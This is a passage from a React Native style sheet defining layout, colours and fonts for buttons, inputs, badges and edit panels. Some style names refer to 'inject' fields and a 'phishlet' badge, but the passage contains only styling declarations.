    gap: theme.spacing(2),
  },
  injectTopRow: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "space-between",
    gap: theme.spacing(2),
  },
  analyseBtn: {
    flexDirection: "row",
    alignItems: "center",
    gap: 4,
    backgroundColor: theme.colors.surfaceAlt,
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: theme.colors.accent,
    paddingHorizontal: theme.spacing(2),
    paddingVertical: 4,
    flexShrink: 0,
  },
  analyseBtnText: {
    color: theme.colors.accent,
    fontSize: 11,
    fontWeight: "700",
    fontFamily: theme.font.mono,
  },
  analysedTag: {
    color: theme.colors.ok,
    fontSize: 11,
    fontFamily: theme.font.mono,
    fontWeight: "700",
  },
  injectHint: {
    color: theme.colors.textDim,
    fontSize: 11,
    lineHeight: 17,
    fontFamily: theme.font.mono,
  },
  injectInput: {
    backgroundColor: theme.colors.surface,
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: theme.colors.border,
    paddingHorizontal: theme.spacing(3),
    paddingVertical: theme.spacing(2.5),
    color: theme.colors.warn,
    fontSize: 12,
    fontFamily: theme.font.mono,
    minHeight: 100,
    lineHeight: 17,
  },
  injectActions: {
    flexDirection: "row",
    gap: theme.spacing(2),
    justifyContent: "flex-end",
  },
  saveInjectBtn: {
    flexDirection: "row",
    alignItems: "center",
    gap: theme.spacing(1.5),
    backgroundColor: theme.colors.warn,
    borderRadius: theme.radius.sm,
    paddingHorizontal: theme.spacing(3),
    paddingVertical: theme.spacing(2.5),
  },
  cardHeadRight: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2) },
  editIconBtn: { width: 26, height: 26, borderRadius: 6, alignItems: "center", justifyContent: "center", backgroundColor: theme.colors.surfaceAlt, borderWidth: 1, borderColor: theme.colors.border },
  editIconBtnActive: { backgroundColor: "rgba(255,178,62,0.15)", borderColor: "rgba(255,178,62,0.4)" },
  editIconText: { color: theme.colors.textDim, fontSize: 14 },
  editIconTextActive: { color: theme.colors.warn },
  domainBanner: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2), backgroundColor: "rgba(34,197,94,0.08)", borderRadius: theme.radius.sm, borderWidth: 1, borderColor: "rgba(34,197,94,0.3)", paddingHorizontal: theme.spacing(3), paddingVertical: theme.spacing(2) },
  domainBannerText: { color: theme.colors.ok, fontSize: 13, fontFamily: theme.font.mono, flex: 1 },
  phishletBadge: { flexDirection: "row", alignItems: "center", gap: theme.spacing(1.5), alignSelf: "flex-start", backgroundColor: "rgba(255,178,62,0.10)", borderRadius: theme.radius.sm, borderWidth: 1, borderColor: "rgba(255,178,62,0.35)", paddingHorizontal: theme.spacing(2), paddingVertical: theme.spacing(1) },
  phishletBadgeText: { color: theme.colors.warn, fontSize: 11, fontWeight: "700", fontFamily: theme.font.mono },
  editPanel: { backgroundColor: theme.colors.bg, borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(3), gap: theme.spacing(2) },
  editLabel: { color: theme.colors.textFaint, fontSize: 10, fontWeight: "700", letterSpacing: 1, fontFamily: theme.font.mono },
  editInput: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.border, color: theme.colors.text, fontSize: 13, fontFamily: theme.font.mono, paddingHorizontal: theme.spacing(3), paddingVertical: theme.spacing(2.5) },
  editSaveBtn: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2), backgroundColor: theme.colors.accent, borderRadius: theme.radius.sm, paddingHorizontal: theme.spacing(4), paddingVertical: theme.spacing(2.5), alignSelf: "flex-end" },
  editSaveText: { color: theme.colors.bg, fontSize: 12, fontWeight: "700" },
  saveInjectText: {
    color: theme.colors.bg,
    fontSize: 12,
    fontWeight: "700",
  },
});
